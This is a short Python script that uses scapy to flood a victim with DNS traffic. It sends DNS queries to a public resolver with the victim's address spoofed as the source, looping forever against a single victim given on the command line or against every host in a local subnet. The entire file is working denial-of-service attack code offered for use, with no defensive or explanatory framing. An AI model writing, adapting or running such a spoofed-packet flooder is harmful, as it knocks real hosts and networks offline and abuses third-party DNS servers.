from scapy import *
from scapy.all import *
import util


def dns_attack(victim):
    while True:
        ip = IP(dst='8.8.8.8', src=victim)
        udp = UDP(dport=53)
        dns = DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0,
                  nscount=0, arcount=0)
        dns.qd = DNSQR(qname='http://isc.org/', qtype=1, qclass=1)
        p = ip/udp/dns
        send(p)


def dns_attack_all_hosts(ipprefix, mask_len, mac='2b:b2:2b:b2:12:34'):
    victim_list = util.get_victim_in_local_network(ipprefix, mask_len)

    while True:
        for victim in victim_list:
            ip = IP(dst='8.8.8.8', src=victim)
            udp = UDP(dport=53)
            dns = DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0,
                      nscount=0, arcount=0)
            dns.qd = DNSQR(qname='www.qq.com', qtype=1, qclass=1)
            p = ip/udp/dns
            send(p)


if __name__ == "__main__":
    #dns_attack_all_host(sys.argv[1], sys.argv[2])
    dns_attack(sys.argv[1])
